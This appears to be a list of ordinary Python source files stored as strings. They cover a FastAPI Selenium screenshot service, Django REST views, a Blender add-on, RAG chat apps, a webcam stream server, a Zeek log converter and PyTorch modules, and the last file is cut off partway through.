    "from fastapi import FastAPI, Response\nfrom selenium import webdriver\nimport os\n\napp = FastAPI()\n\nchrome_options = webdriver.ChromeOptions()\nchrome_options.set_capability('browserless:token', os.environ['BROWSER_TOKEN'])\n# Set args similar to puppeteer's for best performance\nchrome_options.add_argument(\"--window-size=1920,1080\")\nchrome_options.add_argument(\"--disable-background-timer-throttling\")\nchrome_options.add_argument(\"--disable-backgrounding-occluded-windows\")\nchrome_options.add_argument(\"--disable-breakpad\")\nchrome_options.add_argument(\"--disable-component-extensions-with-background-pages\")\nchrome_options.add_argument(\"--disable-dev-shm-usage\")\nchrome_options.add_argument(\"--disable-extensions\")\nchrome_options.add_argument(\"--disable-features=TranslateUI,BlinkGenPropertyTrees\")\nchrome_options.add_argument(\"--disable-ipc-flooding-protection\")\nchrome_options.add_argument(\"--disable-renderer-backgrounding\")\nchrome_options.add_argument(\"--enable-features=NetworkService,NetworkServiceInProcess\")\nchrome_options.add_argument(\"--force-color-profile=srgb\")\nchrome_options.add_argument(\"--hide-scrollbars\")\nchrome_options.add_argument(\"--metrics-recording-only\")\nchrome_options.add_argument(\"--mute-audio\")\nchrome_options.add_argument(\"--headless\")\nchrome_options.add_argument(\"--no-sandbox\")\n\n\n@app.get(\"/\")\nasync def root():\n    driver = webdriver.Remote(\n        command_executor=os.environ['BROWSER_WEBDRIVER_ENDPOINT'],\n        options=chrome_options\n    )\n\n    driver.get(\"https://example.com\")\n\n    screenshot_bytes = driver.get_screenshot_as_png()\n\n    driver.quit()\n\n    return Response(content=screenshot_bytes, media_type='image/png')",
    "from .models import Book, Category, Author\nfrom django.db import IntegrityError\nfrom rest_framework.response import Response\nfrom rest_framework import status\nfrom rest_framework.viewsets import ViewSet\nfrom .serializers import BookSerializer, CategorySerializer, AuthorSerializer\nfrom django.forms.models import model_to_dict\nimport json\n\nclass BookView(ViewSet):\n    def retrieve(self, request, pk=None):\n        try:\n            book = Book.objects.get(id=pk)\n            serialized_book = BookSerializer(book, context={\"request\":request})\n            return Response(serialized_book.data, status=status.HTTP_200_OK)\n        except Exception as e:\n            return Response({\"error\": \"true\", \"message\": str(e)}, status=status.HTTP_404_NOT_FOUND)\n\n    def list(self, request):\n        try:\n            books = Book.objects.select_related(\"category\").all()\n            serialized_books = BookSerializer(books, many=True, context={\"request\":request})\n\n            return Response(serialized_books.data, status=status.HTTP_200_OK)\n        except Exception as e:\n            return Response({\"error\": \"true\", \"message\": str(e)}, status=status.HTTP_404_NOT_FOUND)\n\n    def create(self, request):\n        payload = json.loads(request.body)\n\n        title = payload.get(\"title\")\n        author = payload.get(\"author\")\n        price = payload.get(\"price\")\n        try:\n            book = Book.objects.create(title=title, author=author, price=price)\n\n            inventory = payload.get(\"inventory\")\n            if inventory:\n                book.inventory = inventory\n\n            book.save()\n            return Response({\"success\": \"true\", \"message\": \"Created Successfuly\"}, status=status.HTTP_201_CREATED)\n\n        except IntegrityError as e:\n            return Response({\"error\": \"true\", \"message\": str(e)}, status=status.HTTP_400_BAD_REQUEST)\n\nclass CategoryView(ViewSet):\n    def list(self, request):\n        categories = Category.objects.all()\n        serialized_category = CategorySerializer(categories, many=True)\n\n        return Response(serialized_category.data, status=status.HTTP_200_OK)\n    \n    def retrieve(self, request, pk=None):\n        categories = Category.objects.get(pk=pk)\n        serialized_category = CategorySerializer(categories)\n        \n        return Response(serialized_category.data, status=status.HTTP_200_OK)\n\nclass AuthorView(ViewSet):\n    def list(self, request):\n        authors = Author.objects.all()\n        serialized_authors = AuthorSerializer(authors, many=True)\n        return Response(serialized_authors.data, status=status.HTTP_200_OK)\n    \n    def retrieve(self, request, pk=None):\n        author = Author.objects.get(pk=pk)\n        serialized_author = AuthorSerializer(author)\n        \n        return Response(serialized_author.data, status=status.HTTP_200_OK)\n",
    "bl_info = {\r\n    \"name\": \"Archicad Import Adjustments\",\r\n    \"author\": \"Leandro Paganelli\",\r\n    \"version\": (1, 1),\r\n    \"blender\": (4, 1, 0),\r\n    \"category\": \"Scene\",\r\n    \"description\": \"Makes adjustments after importing from Archicad. License: MIT\",\r\n    \"location\": \"Properties > Scene\",\r\n#    \"warning\": \"\",\r\n#    \"doc_url\": \"https://seusite.com/doc\",\r\n#    \"tracker_url\": \"https://seusite.com/bugtracker\",\r\n}\r\n\r\nimport bpy\r\nfrom mathutils import Vector\r\n\r\n# First operator: Add Gamma Node\r\nclass SimpleOperator1(bpy.types.Operator):\r\n    bl_idname = \"scene.add_gamma_node\"\r\n    bl_label = \"Correct Colors\"\r\n    \r\n    def execute(self, context):\r\n        materials = bpy.data.materials\r\n        for material in materials:\r\n            if material.use_nodes and material.node_tree.nodes.get(\"Principled BSDF\"):\r\n                principled_node = material.node_tree.nodes.get(\"Principled BSDF\")\r\n                if not principled_node.inputs['Base Color'].is_linked and not principled_node.inputs['Base Color'].links:\r\n                    gamma_node = material.node_tree.nodes.new('ShaderNodeGamma')\r\n                    gamma_node.location = principled_node.location - Vector((300, 0))\r\n                    gamma_node.inputs[1].default_value = 2\r\n                    gamma_node.inputs[0].default_value = principled_node.inputs['Base Color'].default_value\r\n                    material.node_tree.links.new(gamma_node.outputs[0], principled_node.inputs['Base Color'])\r\n        return {'FINISHED'}\r\n\r\n# Second operator: Set Metallic to Zero\r\nclass SimpleOperator2(bpy.types.Operator):\r\n    bl_idname = \"scene.set_metallic_to_zero\"\r\n    bl_label = \"Correct Metallic, Roughness and Specular\"\r\n    \r\n    def execute(self, context):\r\n        for material in bpy.data.materials:\r\n            if material.use_nodes and material.node_tree.nodes.get(\"Principled BSDF\"):\r\n                principled_bsdf_node = material.node_tree.nodes.get(\"Principled BSDF\")\r\n                principled_bsdf_node.inputs[\"Metallic\"].default_value = 0.0\r\n                principled_bsdf_node.inputs[\"Roughness\"].default_value = 0.5\r\n                principled_bsdf_node.inputs[\"Specular IOR Level\"].default_value = 0.5\r\n        return {'FINISHED'}\r\n\r\n# Third operator: Remove Duplicate Vertices\r\nclass RemoveDuplicateVerticesOperator(bpy.types.Operator):\r\n    bl_idname = \"scene.remove_duplicate_vertices\"\r\n    bl_label = \"Remove Duplicate Vertices\"\r\n    \r\n    def execute(self, context):\r\n        # Save current active object\r\n        active_object = bpy.context.view_layer.objects.active\r\n\r\n        # Create a list to hold mesh objects\r\n        mesh_objects = [obj for obj in bpy.context.selected_objects if obj.type == 'MESH']\r\n\r\n        # If there are mesh objects, make the first one the active object\r\n        if mesh_objects:\r\n            bpy.context.view_layer.objects.active = mesh_objects[0]\r\n        \r\n        # Select all mesh objects\r\n        for obj in mesh_objects:\r\n            obj.select_set(True)\r\n        \r\n        # Enter Multi-Object Edit Mode\r\n        bpy.ops.object.mode_set(mode='EDIT')\r\n        \r\n        # Select All Vertices\r\n        bpy.ops.mesh.select_all(action='SELECT')\r\n        \r\n        # Run the \"Merge by Distance\" command\r\n        bpy.ops.mesh.remove_doubles()\r\n        \r\n        # Return to Object Mode\r\n        bpy.ops.object.mode_set(mode='OBJECT')\r\n\r\n        # Restore the active object\r\n        bpy.context.view_layer.objects.active = active_object\r\n        \r\n        return {'FINISHED'}\r\n\r\n# Panel to hold the buttons\r\nclass OBJECT_PT_SimplePanel(bpy.types.Panel):  # Renamed to follow convention\r\n    bl_label = \"Adjusts after Archicad import\"\r\n    bl_idname = \"OBJECT_PT_SimplePanel\"\r\n    bl_space_type = 'PROPERTIES'\r\n    bl_region_type = 'WINDOW'\r\n    bl_context = \"scene\"\r\n    \r\n    def draw(self, context):\r\n        layout = self.layout\r\n        layout.operator(\"scene.add_gamma_node\")\r\n        layout.operator(\"scene.set_metallic_to_zero\")\r\n        layout.operator(\"scene.remove_duplicate_vertices\")\r\n\r\n# Register and Unregister functions\r\ndef register():\r\n    bpy.utils.register_class(SimpleOperator1)\r\n    bpy.utils.register_class(SimpleOperator2)\r\n    bpy.utils.register_class(RemoveDuplicateVerticesOperator)\r\n    bpy.utils.register_class(OBJECT_PT_SimplePanel)  # Renamed to follow convention\r\n    \r\ndef unregister():\r\n    bpy.utils.unregister_class(OBJECT_PT_SimplePanel)  # Renamed to follow convention\r\n    bpy.utils.unregister_class(RemoveDuplicateVerticesOperator)\r\n    bpy.utils.unregister_class(SimpleOperator2)\r\n    bpy.utils.unregister_class(SimpleOperator1)\r\n\r\nif __name__ == \"__main__\":\r\n    register()\r\n",
    "import ipywidgets as widgets\nfrom IPython.display import display\n\nclass RHRCalculator(widgets.VBox):\n    def __init__(self):\n        super().__init__()\n\n        self.age = None\n        self.gender = None\n        self.rhr = None\n\n        # Define the health conditions and corresponding RHR values by age groups as per the tables\n        self.health_conditions_men = {\n            'Athlete': [52, 50, 53, 54, 56, 55],\n            'Excellent': [61, 61, 62, 63, 61, 61],\n            'Good': [65, 65, 66, 67, 67, 65],\n            'Above Average': [69, 70, 70, 71, 71, 69],\n            'Average': [73, 74, 75, 76, 75, 73],\n            'Below Average': [81, 81, 82, 83, 81, 79],\n            'Poor': [82, 82, 83, 84, 82, 80]\n        }\n\n        self.health_conditions_women = {\n            'Athlete': [48, 46, 49, 54, 55, 55],\n            'Excellent': [65, 64, 64, 65, 64, 64],\n            'Good': [69, 68, 69, 69, 68, 68],\n            'Above Average': [73, 72, 73, 73, 73, 72],\n            'Average': [78, 76, 78, 77, 77, 76],\n            'Below Average': [84, 82, 84, 83, 83, 84],\n            'Poor': [85, 83, 85, 84, 84, 84]\n        }\n\n        # Create the gender toggle buttons\n        gender_toggle = widgets.ToggleButtons(\n            options=['Men', 'Women'],\n            description='Gender:',\n            disabled=False,\n            button_style='',  # 'success', 'info', 'warning', 'danger' or ''\n            tooltips=['Calculate for men', 'Calculate for women'],\n        )\n\n        # Styling attributes\n        style = {'description_width': 'initial'}\n        layout = widgets.Layout(width='auto', display='flex')\n\n        # Create widgets with style and layout\n        age_input = widgets.IntText(value=40, description='Enter your age:', style=style, layout=layout)\n        health_dropdown = widgets.Dropdown(\n            options=list(self.health_conditions_men.keys()),\n            value='Average',\n            description='Select your health condition:',\n            style=style,\n            layout=layout\n        )\n        calculate_button = widgets.Button(\n            description=\"Calculate RHR\",\n            layout=layout,\n            button_style='success'  # Use a predefined styling for the button\n        )\n        output_label = widgets.Label(layout=layout)  # Label to display the result\n\n        # Function to calculate and display the upper bound RHR\n        def calculate_display_rhr(age, condition, gender):\n            # Select the correct health conditions table based on gender\n            if gender == 'Men':\n                health_conditions = self.health_conditions_men\n            else:\n                health_conditions = self.health_conditions_women\n\n            # Determine the age index\n            if age < 25:\n                age_index = 0\n            elif age <= 35:\n                age_index = 1\n            elif age <= 45:\n                age_index = 2\n            elif age <= 55:\n                age_index = 3\n            elif age <= 65:\n                age_index = 4\n            else:\n                age_index = 5\n\n            # Get the RHR values based on health condition and age index\n            rhr_values = health_conditions[condition]\n            upper_bound_rhr = rhr_values[age_index]\n            return upper_bound_rhr\n\n        # Function to handle the button click event\n        def on_calculate_button_clicked(b):\n            # Get the current values from the widgets\n            self.age = age_input.value\n            self.gender = gender_toggle.value\n            health_condition = health_dropdown.value\n\n            # Calculate the RHR using the selected age, gender, and health condition\n            self.rhr = calculate_display_rhr(self.age, health_condition, self.gender)\n\n            # Update the label with the result\n            output_label.value = f\"The expected resting heart rate (RHR) for {self.gender.lower()}: {self.rhr} bpm\"\n\n        # Bind the button click to the event function\n        calculate_button.on_click(on_calculate_button_clicked)\n\n        # Set up the interactive output for live update as the user changes the inputs\n        interactive_output = widgets.interactive_output(\n            calculate_display_rhr,\n            {'age': age_input, 'condition': health_dropdown, 'gender': gender_toggle}\n        )\n\n        # Layout to organize widgets vertically\n        box_layout = widgets.Layout(display='flex', flex_flow='column', align_items='center', width='50%')\n        box = widgets.Box(children=[gender_toggle, age_input, health_dropdown, calculate_button, output_label], layout=box_layout)\n\n        # Add the box to the VBox\n        self.children = [box, interactive_output]\n\n    def get_values(self):\n        return self.age, self.gender, self.rhr\n\ndef rhr_calculator():\n    calculator = RHRCalculator()\n    display(calculator)\n    return calculator",
    "import streamlit as st\nimport rag\n\ndef chatbot_response(user_input):\n    # Here you would implement your chatbot logic to generate a response\n    # For simplicity, let's just echo the user's input\n    # st.write(ans)\n    return f\"You said: '{user_input}'\"\n\ndef main():\n    st.title(\"Quran Query Assistant\")\n\n    user_input = st.text_input(\"Enter your message here:\", key=\"user_input\")\n\n    if st.button(\"Submit\"):\n        if user_input:\n            # response = chatbot_response(user_input)\n            response = rag.answerable(user_input)\n            st.text_area(\"Response:\", value=response, height=100, key=\"bot_response\")\n\nif __name__ == \"__main__\":\n    main()\n\n\n\n# import streamlit as st\n# import rag\n\n# def chatbot_response(user_input):\n#     # Here you would implement your chatbot logic to generate a response\n#     # For simplicity, let's just echo the user's input\n#     #st.write(ans)\n#     return f\"You said: '{user_input}'\"\n\n# def main():\n#     st.title(\"Quran GPT\")\n\n#     st.sidebar.header(\"User Input\")\n#     user_input = st.sidebar.text_input(\"Enter your message here:\")\n\n#     if st.sidebar.button(\"Send\"):\n#         if user_input:\n#             #response = chatbot_response(user_input)\n#             response = rag.answerable(user_input)\n#             st.text_area(\"Bot Response:\", value=response, height=100)\n\n# if __name__ == \"__main__\":\n#     main()",
    "import os\n\nfrom dotenv import load_dotenv\nload_dotenv()\n\nimport streamlit as st\nimport openai\n\nfrom llama_index.llms.openai import OpenAI\nfrom llama_index.core.node_parser import SentenceSplitter\nfrom llama_index.core import VectorStoreIndex, Settings, ServiceContext, SimpleDirectoryReader\nfrom llama_index.embeddings.openai import OpenAIEmbedding\n\nfrom llama_index.vector_stores.chroma import ChromaVectorStore\nfrom llama_index.core.storage import StorageContext\n\n# import chromadb for storing embeddings\nimport chromadb\n\n# import OpenAI API key\nopenai.api_key =  os.getenv(\"OPENAI_API_KEY\")\n\n# Set the StreamLit page configuration\nst.set_page_config(page_title=\"Chat with the docs in the PDF folder, powered by LlamaIndex\", page_icon=\"\ud83e\udd99\", layout=\"centered\", initial_sidebar_state=\"auto\", menu_items=None)\nst.title(\"Retrieval Augmentation System using provided PDF information and powered by LlamaIndex and OpenAI \ud83e\udd99\ud83e\uddbe\")\nst.info(\"[source](https://blog.streamlit.io/build-a-chatbot-with-custom-data-sources-powered-by-llamaindex/)\", icon=\"\ud83d\udcc3\")\n\n# Add a sidebar with a dropdown menu\nllm_engine = st.sidebar.selectbox(\"Select LLM Engine\", [\"gpt-3.5-turbo\", \"gpt-4\", \"llama-7b\"])\n\n# Print the selected value in the console\nprint(\"Selected LLM Engine:\", llm_engine)\n\nif \"messages\" not in st.session_state.keys(): # Initialize the chat messages history\n    st.session_state.messages = [\n        {\"role\": \"assistant\", \"content\": \"Ask me a question about Chemical Engineering!\"}\n            ]\n\n@st.cache_resource(show_spinner=False)\ndef load_data():\n    with st.spinner(text=\"Loading and indexing the Streamlit docs \u2013 hang tight! This should take one minute.\"):\n        reader = SimpleDirectoryReader(input_dir=\"../PDFs\", recursive=True)\n        docs = reader.load_data()\n\n        embed_model = OpenAIEmbedding()\n        node_parser = SentenceSplitter(chunk_size=1024, chunk_overlap=20)\n\n        # OpenAI Settings\n        Settings.llm = OpenAI(\n                temperature=0.1,\n                model=llm_engine,\n                # model=\"gpt-4\",\n                system_prompt=\"You are an expert with global expertise, and with extensive knowledge in Chemical Engineering and Sustainability. Many questions will be related to Process Engineering, Process Simulation, Capital Cost Estimation, Front End Engineering Design, or Digital Twins in general. Try to keep your answers technical and based on facts, but if you receive a question outside the context you are familiar with, then use the OpenAI Agent Mode to provide an answer to the best of your ability. Limit feature hallucination as much as possible.\"\n                )\n        Settings.embed_model=embed_model\n        Settings.node_parser=node_parser\n\n        # STORING THE EMBEDDINGS IN CHROMA DB\n        # initialize client, setting path to save data\n        db = chromadb.PersistentClient(path=\"./chroma_db\")\n\n        # create collection\n        chroma_collection = db.get_or_create_collection(\"quickstart\")\n\n        # assign chroma as the vector_store to the context\n        vector_store = ChromaVectorStore(chroma_collection=chroma_collection)\n        storage_context = StorageContext.from_defaults(vector_store=vector_store)\n\n        # Top-k semantic retrieval\n        index = VectorStoreIndex.from_documents(\n            docs,\n            storage_context=storage_context\n            )\n\n        return index\n\nindex = load_data()\n\nif \"chat_engine\" not in st.session_state.keys(): # Initialize the chat engine\n        st.session_state.chat_engine = index.as_chat_engine(chat_mode=\"openai\", verbose=True)\n\nif prompt := st.chat_input(\"Your question\"): # Prompt for user input and save to chat history\n    st.session_state.messages.append({\"role\": \"user\", \"content\": prompt})\n\nfor message in st.session_state.messages: # Display the prior chat messages\n    with st.chat_message(message[\"role\"]):\n        st.write(message[\"content\"])\n\n# If last message is not from assistant, generate a new response\nif st.session_state.messages[-1][\"role\"] != \"assistant\":\n    with st.chat_message(\"assistant\"):\n        with st.spinner(\"Thinking...\"):\n            response = st.session_state.chat_engine.chat(prompt)\n            st.write(response.response)\n            message = {\"role\": \"assistant\", \"content\": response.response}\n            st.session_state.messages.append(message) # Add response to message history\n",
    "# -*- coding: utf-8 -*-\nimport cv2  \nimport socketserver  \nfrom http.server import SimpleHTTPRequestHandler  \nimport threading  \n  \n# \u8bbe\u7f6e\u6444\u50cf\u5934  \ncap = cv2.VideoCapture(0)  \n  \n# \u8bbe\u7f6eHTTP\u670d\u52a1\u5668  \nPORT = 8000  \n  \nclass StreamingHTTPRequestHandler(SimpleHTTPRequestHandler):  \n    def do_GET(self):  \n        if self.path.endswith('.mjpg'):  \n            self.send_response(200)  \n            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=--jpgboundary')  \n            self.end_headers()  \n            return self.serve_mjpeg()  \n        return super().do_GET()  \n  \n    def serve_mjpeg(self):  \n        try:  \n            while True:  \n                ret, frame = cap.read()  \n                if not ret:  \n                    break  \n                rgbImage = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)  \n                j, img_encoded = cv2.imencode('.jpg', rgbImage)  \n                self.wfile.write(\"--jpgboundary\\r\\n\".encode())  \n                self.send_header('Content-type', 'image/jpeg')  \n                self.send_header('Content-length', str(len(img_encoded)))  \n                self.end_headers()  \n                self.wfile.write(img_encoded.tobytes())  \n        except Exception as e:  \n            print(e)  \n        finally:  \n            cap.release()  \n  \nwith socketserver.TCPServer((\"\", PORT), StreamingHTTPRequestHandler) as httpd:  \n    print(\"serving at port\", PORT)  \n    httpd.serve_forever()",
    "#!/usr/bin/env python3\n# -*- coding: UTF-8 -*-\nimport numpy as np\nimport torch as t\nimport torch.nn as nn\nimport torch.optim as optim\nfrom matplotlib import pyplot as plt\n\n\"\"\"\nANN(\u4eba\u5de5\u795e\u7ecf\u7f51\u7edc)\n\u4f7f\u7528\u591a\u5c42\u795e\u7ecf\u5143\u548c\u6fc0\u6d3b\u51fd\u6570\u6765\u6784\u6210\u4e00\u4e2a\u590d\u6742\u7684\u975e\u7ebf\u6027\u6620\u5c04\u51fd\u6570.\u4f7f\u7528\u57fa\u4e8e\u68af\u5ea6\u7684\u4f18\u5316\u7b97\u6cd5,\u53ef\u80fd\u9677\u5165\u5c40\u90e8\u6700\u4f18\u89e3\n\"\"\"\n\n\n# \u5b9a\u4e49\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\u6a21\u578b\nclass NeuralNetwork(nn.Module):\n    def __init__(self):\n        super(NeuralNetwork, self).__init__()\n        self.layer1 = nn.Linear(1, 10)\n        self.layer2 = nn.Linear(10, 1)\n\n    def forward(self, x):\n        x = t.relu(self.layer1(x))\n        return self.layer2(x)\n\n\ndef test01():\n    x = np.arange(0, 20, dtype=\"float32\")\n    y = 2.5 * x + 5 * np.random.uniform(-1, 1)\n\n    model = NeuralNetwork()\n\n    # \u5b9a\u4e49\u635f\u5931\u51fd\u6570\u548c\u4f18\u5316\u5668\n    criterion = nn.MSELoss()\n    optimizer = optim.Adam(model.parameters(), lr=0.01)\n\n    # \u8bad\u7ec3\u6a21\u578b\n    x_tensor = t.from_numpy(x.reshape(-1, 1))  # \u8f6c\u6362\u4e3a\u5f20\u91cf\n    y_tensor = t.from_numpy(y.reshape(-1, 1))\n    for _ in range(1000):\n        optimizer.zero_grad()\n        outputs = model(x_tensor)\n        loss = criterion(outputs, y_tensor)\n        loss.backward()\n        optimizer.step()\n\n    # \u9884\u6d4b\u65b0\u6570\u636e\n    y_new = model(x_tensor)\n\n    # \u53ef\u89c6\u5316\n    plt.figure(figsize=(16, 9))\n    plt.title(\"ANN\")\n    plt.xlabel(\"x\")\n    plt.ylabel(\"y\")\n    plt.scatter(x, y, color=\"blue\")\n    plt.plot(x, y_new.detach().numpy(), color=\"red\", label=\"predict\")\n    plt.legend()\n    plt.show()\n\n\nif __name__ == \"__main__\":\n    test01()\n",
    "#!/usr/bin/python3\nimport sqlite3\nimport os\nimport csv\n\ndef create_table_from_log(cursor, table_name, columns):\n    if not columns:  # Check if the columns list is empty\n        raise ValueError(f\"No columns found for table {table_name}\")\n    column_definitions = ', '.join([f'\"{col}\" TEXT' for col in columns])\n    create_table_sql = f'CREATE TABLE IF NOT EXISTS \"{table_name}\" ({column_definitions});'\n    cursor.execute(create_table_sql)\n\ndef insert_data_from_log(cursor, table_name, columns, data):\n    placeholders = ', '.join(['?' for _ in columns])\n    column_names = ', '.join([f'\"{col}\"' for col in columns])\n    insert_sql = f'INSERT INTO \"{table_name}\" ({column_names}) VALUES ({placeholders});'\n    cursor.executemany(insert_sql, data)\n\ndef convert_zeek_logs_to_sqlite(db_name, directory):\n    conn = sqlite3.connect(db_name)\n    cursor = conn.cursor()\n\n    for filename in os.listdir(directory):\n        if filename.endswith(\".log\"):\n            table_name = os.path.splitext(filename)[0].replace('-', '_')  # Ensure table names are valid SQLite identifiers\n            log_path = os.path.join(directory, filename)\n\n            with open(log_path, 'r') as file:\n                reader = csv.reader(file, delimiter='\\t')\n                columns = []\n                for row in reader:\n                    if row[0].startswith('#fields'):\n                        columns = [col.replace('.', '_') for col in row[1:]]  # Adjusted to handle '#fields'\n                        break  # Stop after finding the columns\n\n                if not columns:\n                    print(f\"No columns extracted for {filename}.\")\n                    continue\n\n                create_table_from_log(cursor, table_name, columns)\n\n                data = [row for row in reader if not row[0].startswith('#')]  # Skip comment lines\n                insert_data_from_log(cursor, table_name, columns, data)\n\n    conn.commit()\n    conn.close()\n\n# Example usage\ndirectory_path = '/data/'  # Update this to the path of your Zeek log files\ndb_name = 'zeek_logs.db'\nconvert_zeek_logs_to_sqlite(db_name, directory_path)\n\n",
    "try:\r\n    import smea_sampling\r\n    from smea_sampling import sample_euler_dy, sample_euler_smea_dy, sample_euler_negative, sample_euler_dy_negative\r\n\r\n    if smea_sampling.BACKEND == \"WebUI\":\r\n        from modules import scripts, sd_samplers_common, sd_samplers\r\n        from modules.sd_samplers_kdiffusion import sampler_extra_params, KDiffusionSampler\r\n\r\n        class SMEA(scripts.Script):\r\n            def title(self):\r\n                \"SMEA Samplers\"\r\n\r\n            def show(self, is_img2img):\r\n                return False\r\n\r\n            def __init__(self):\r\n                if not smea_sampling.INITIALIZED:\r\n                    samplers_smea = [\r\n                        (\"Euler Dy\", sample_euler_dy, [\"k_euler_dy\"], {}),\r\n                        (\"Euler SMEA Dy\", sample_euler_smea_dy, [\"k_euler_smea_dy\"], {}),\r\n                        (\"Euler Negative\", sample_euler_negative, [\"k_euler_negative\"], {}),\r\n                        (\"Euler Negative Dy\", sample_euler_dy_negative, [\"k_euler_negative_dy\"], {}),\r\n                    ]\r\n                    samplers_data_smea = [\r\n                        sd_samplers_common.SamplerData(label, lambda model, funcname=funcname: KDiffusionSampler(funcname, model), aliases, options)\r\n                        for label, funcname, aliases, options in samplers_smea\r\n                        if callable(funcname)\r\n                    ]\r\n                    sampler_extra_params[\"sample_euler_dy\"] = [\"s_churn\", \"s_tmin\", \"s_tmax\", \"s_noise\"]\r\n                    sampler_extra_params[\"sample_euler_smea_dy\"] = [\"s_churn\", \"s_tmin\", \"s_tmax\", \"s_noise\"]\r\n                    sampler_extra_params[\"sample_euler_negative\"] = [\"s_churn\", \"s_tmin\", \"s_tmax\", \"s_noise\"]\r\n                    sampler_extra_params[\"sample_euler_dy_negative\"] = [\"s_churn\", \"s_tmin\", \"s_tmax\", \"s_noise\"]\r\n                    sd_samplers.all_samplers.extend(samplers_data_smea)\r\n                    sd_samplers.all_samplers_map = {x.name: x for x in sd_samplers.all_samplers}\r\n                    sd_samplers.set_samplers()\r\n                    smea_sampling.INITIALIZED = True\r\n\r\nexcept ImportError as _:\r\n    pass\r\n",
    "from os import path\nimport torch \nimport torch.distributed as dist\nimport torch.autograd as autograd\nimport torch.cuda.comm as comm\nfrom torch.autograd.function import once_differentiable\nfrom torch.utils.cpp_extension import load\n\n_src_path = path.join(path.dirname(path.abspath(__file__)), \"src\")\n_backend = load(name=\"inplace_abn\",\n                extra_cflags=[\"-O3\"],\n                sources=[path.join(_src_path, f) for f in [\n                    \"inplace_abn.cpp\",\n                    \"inplace_abn_cpu.cpp\",\n                    \"inplace_abn_cuda.cu\",\n                    \"inplace_abn_cuda_half.cu\"\n                ]],\n                extra_cuda_cflags=[\"--expt-extended-lambda\"])\n\n# Activation names\nACT_RELU = \"relu\"\nACT_LEAKY_RELU = \"leaky_relu\"\nACT_ELU = \"elu\"\nACT_NONE = \"none\"\n\n\ndef _check(fn, *args, **kwargs):\n    success = fn(*args, **kwargs)\n    if not success:\n        raise RuntimeError(\"CUDA Error encountered in {}\".format(fn))\n\n\ndef _broadcast_shape(x):\n    out_size = []\n    for i, s in enumerate(x.size()):\n        if i != 1:\n            out_size.append(1)\n        else:\n            out_size.append(s)\n    return out_size\n\n\ndef _reduce(x):\n    if len(x.size()) == 2:\n        return x.sum(dim=0)\n    else:\n        n, c = x.size()[0:2]\n        return x.contiguous().view((n, c, -1)).sum(2).sum(0)\n\n\ndef _count_samples(x):\n    count = 1\n    for i, s in enumerate(x.size()):\n        if i != 1:\n            count *= s\n    return count\n\n\ndef _act_forward(ctx, x):\n    if ctx.activation == ACT_LEAKY_RELU:\n        _backend.leaky_relu_forward(x, ctx.slope)\n    elif ctx.activation == ACT_ELU:\n        _backend.elu_forward(x)\n    elif ctx.activation == ACT_NONE:\n        pass\n\n\ndef _act_backward(ctx, x, dx):\n    if ctx.activation == ACT_LEAKY_RELU:\n        _backend.leaky_relu_backward(x, dx, ctx.slope)\n    elif ctx.activation == ACT_ELU:\n        _backend.elu_backward(x, dx)\n    elif ctx.activation == ACT_NONE:\n        pass\n\n\nclass InPlaceABN(autograd.Function):\n    @staticmethod\n    def forward(ctx, x, weight, bias, running_mean, running_var,\n                training=True, momentum=0.1, eps=1e-05, activation=ACT_LEAKY_RELU, slope=0.01):\n        # Save context\n        ctx.training = training\n        ctx.momentum = momentum\n        ctx.eps = eps\n        ctx.activation = activation\n        ctx.slope = slope\n        ctx.affine = weight is not None and bias is not None\n\n        # Prepare inputs\n        count = _count_samples(x)\n        x = x.contiguous()\n        weight = weight.contiguous() if ctx.affine else x.new_empty(0)\n        bias = bias.contiguous() if ctx.affine else x.new_empty(0)\n\n        if ctx.training:\n            mean, var = _backend.mean_var(x)\n\n            # Update running stats\n            running_mean.mul_((1 - ctx.momentum)).add_(ctx.momentum * mean)\n            running_var.mul_((1 - ctx.momentum)).add_(ctx.momentum * var * count / (count - 1))\n\n            # Mark in-place modified tensors\n            ctx.mark_dirty(x, running_mean, running_var)\n        else:\n            mean, var = running_mean.contiguous(), running_var.contiguous()\n            ctx.mark_dirty(x)\n\n        # BN forward + activation\n        _backend.forward(x, mean, var, weight, bias, ctx.affine, ctx.eps)\n        _act_forward(ctx, x)\n\n        # Output\n        ctx.var = var\n        ctx.save_for_backward(x, var, weight, bias)\n        return x\n\n    @staticmethod\n    @once_differentiable\n    def backward(ctx, dz):\n        z, var, weight, bias = ctx.saved_tensors\n        dz = dz.contiguous()\n\n        # Undo activation\n        _act_backward(ctx, z, dz)\n\n        if ctx.training:\n            edz, eydz = _backend.edz_eydz(z, dz, weight, bias, ctx.affine, ctx.eps)\n        else:\n            # TODO: implement simplified CUDA backward for inference mode\n            edz = dz.new_zeros(dz.size(1))\n            eydz = dz.new_zeros(dz.size(1))\n\n        dx = _backend.backward(z, dz, var, weight, bias, edz, eydz, ctx.affine, ctx.eps)\n        dweight = eydz * weight.sign() if ctx.affine else None\n        dbias = edz if ctx.affine else None\n\n        return dx, dweight, dbias, None, None, None, None, None, None, None\n\nclass InPlaceABNSync(autograd.Function):\n    @classmethod\n    def forward(cls, ctx, x, weight, bias, running_mean, running_var,\n                training=True, momentum=0.1, eps=1e-05, activation=ACT_LEAKY_RELU, slope=0.01, equal_batches=True):\n        # Save context\n        ctx.training = training\n        ctx.momentum = momentum\n        ctx.eps = eps\n        ctx.activation = activation\n        ctx.slope = slope\n        ctx.affine = weight is not None and bias is not None\n\n        # Prepare inputs\n        ctx.world_size = dist.get_world_size() if dist.is_initialized() else 1\n\n        #count = _count_samples(x)\n        batch_size = x.new_tensor([x.shape[0]],dtype=torch.long)\n\n        x = x.contiguous()\n        weight = weight.contiguous() if ctx.affine else x.new_empty(0)\n        bias = bias.contiguous() if ctx.affine else x.new_empty(0)\n\n        if ctx.",
